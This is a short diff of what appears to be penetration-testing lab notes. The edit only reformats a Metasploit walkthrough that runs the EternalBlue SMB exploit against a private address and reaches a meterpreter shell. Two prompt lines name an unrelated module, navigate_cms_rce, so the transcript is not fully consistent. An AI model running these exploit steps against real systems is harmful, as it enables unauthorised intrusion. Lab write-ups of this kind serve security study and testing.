@@ -228,14 +228,14 @@ NMAP SCRIPTS:
 
 - Use of Metasploit to attack the machine using 'EternalBlue' exploit.
 
-1	msf > use exploit/windows/smb/ms17_010_eternalblue
-2	exploit(windows/smb/ms17_010_eternalblue) >  show targets
+1.	msf > use exploit/windows/smb/ms17_010_eternalblue
+2.	exploit(windows/smb/ms17_010_eternalblue) >  show targets
 	
 		Exploit targets:
 		.
 	   	Id  Name
 	   	.
-	    0   Automatic Target
+	    	0   Automatic Target
 	   	1   Windows 7
 	   	2   Windows Embedded Standard 7
 	   	3   Windows Server 2008 R2
@@ -245,10 +245,13 @@ NMAP SCRIPTS:
 	   	7   Windows 10 Pro
 	   	8   Windows 10 Enterprise Evaluation
 
-3	msf exploit(navigate_cms_rce) > set TARGET 0
-4	msf exploit(navigate_cms_rce) > show options
-5	exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.100.208
-6	exploit(windows/smb/ms17_010_eternalblue) > exploit
+3.	msf exploit(navigate_cms_rce) > set TARGET 0
+
+4.	msf exploit(navigate_cms_rce) > show options
+
+5.	exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.100.208
+
+6.	exploit(windows/smb/ms17_010_eternalblue) > exploit
 
 		meterpreter > shell
 		Process 1080 created.
